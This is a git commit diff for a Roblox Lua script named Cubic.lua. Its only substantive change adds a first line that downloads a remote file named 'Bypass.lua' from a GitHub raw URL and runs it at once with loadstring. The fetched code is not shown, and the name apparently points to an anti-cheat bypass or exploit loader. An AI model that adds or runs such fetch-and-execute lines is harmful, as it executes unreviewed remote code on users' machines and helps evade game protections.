5e822321a86018a46a2235f99452fb4d81715489
cjwstar25-png <cjwstar25@gmail.com>
2026-08-12 14:14:40 +0900

    ㅈ

--- Cubic.lua
+++ Cubic.lua
@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cjwstar25-png/WJNof9r29jk1oi23134/refs/heads/main/Bypass.lua"))()
+
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
